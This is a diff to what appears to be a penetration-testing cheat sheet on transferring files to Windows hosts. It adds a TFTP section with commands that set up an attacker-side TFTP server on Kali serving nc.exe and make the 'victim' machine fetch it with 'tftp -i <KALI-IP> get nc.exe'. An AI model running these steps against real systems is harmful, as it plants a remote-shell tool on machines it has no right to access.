@@ -41,6 +41,32 @@ echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
 
+## TFTP
+
+By default in XP and 2003 (in others it need to be explicitly added during installation)
+
+In Kali, **start TFTP server**:
+
+```bash
+#I didn't get this options working and I prefer the python option
+mkdir /tftp
+atftpd --daemon --port 69 /tftp
+cp /path/tp/nc.exe /tftp
+```
+
+**TFTP server in python:**
+
+```bash
+pip install ptftpd
+ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
+```
+
+In **victim**, connect to the Kali server:
+
+```bash
+tftp -i <KALI-IP> get nc.exe
+```
+
 ## Windows FTP Server Powershell
 
 {% embed url="https://ridicurious.com/2020/07/02/setup-ftp-server-with-powershell" %}
